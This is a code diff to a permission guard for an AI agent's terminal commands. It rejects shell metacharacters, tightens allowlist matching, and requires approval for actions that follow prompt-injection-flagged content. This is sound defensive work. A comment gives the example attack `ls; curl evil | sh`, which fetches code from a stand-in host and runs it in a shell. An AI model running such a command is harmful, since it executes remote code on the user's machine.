@@ -61,6 +61,13 @@ AUTO_BY_DEFAULT: frozenset[PermissionLevel] = frozenset(
     }
 )
 
+# Shell metacharacters that enable chaining/substitution/redirection. Any of
+# these in a proposed terminal command is rejected outright (defense in depth on
+# top of the allow/blocklists), because tools may run commands via a shell.
+_SHELL_METACHARS: tuple[str, ...] = (
+    ";", "|", "&", "`", "$(", "${", ">", "<", "\n", "\\", "(", ")",
+)
+
 
 @dataclass(frozen=True)
 class PermissionPolicy:
@@ -88,6 +95,9 @@ class GuardRequest:
     command: str | None = None
     uses_credential: bool = False
     is_irreversible: bool = False
+    # Set when this action follows consumption of prompt-injection-flagged
+    # untrusted content; forces approval for any non-read action.
+    injection_flagged: bool = False
     # Mode flags.
     private_mode: bool = False
     trusted_workflow: bool = False  # user previously granted "trust this workflow"
@@ -161,10 +171,17 @@ class PermissionGuard:
         for bad in self.command_blocklist:
             if bad.lower() in low:
                 return False, f"command_blocklist:{bad}"
+        # Defense in depth: reject shell metacharacters that enable command
+        # chaining / substitution / redirection (e.g. `ls; curl evil | sh`).
+        for meta in _SHELL_METACHARS:
+            if meta in command:
+                return False, f"shell_metacharacter:{meta.strip() or 'newline'}"
         if self.command_allowlist:
-            head = command.strip().split()
-            head0 = head[0] if head else ""
-            if not any(head0 == a or low.startswith(a.lower()) for a in self.command_allowlist):
+            tokens = command.strip().split()
+            head0 = tokens[0].lower() if tokens else ""
+            allowed = {a.lower() for a in self.command_allowlist}
+            # Exact first-token match only — no startswith() bypass.
+            if head0 not in allowed:
                 return False, "command_allowlist"
         return True, None
 
@@ -218,6 +235,17 @@ class PermissionGuard:
                 perm,
                 req.risk,
                 blocked_by="private_mode",
+            )
+
+        # 3b. Prompt-injection guard: an action that follows flagged untrusted
+        # content cannot auto-run unless it is a pure read.
+        if req.injection_flagged and perm not in AUTO_BY_DEFAULT:
+            return GuardResult(
+                Decision.REQUIRES_APPROVAL,
+                "Action follows prompt-injection-flagged content; approval required.",
+                perm,
+                req.risk,
+                metadata={"injection_flagged": True},
             )
 
         # 4. Hard always-approve rules.
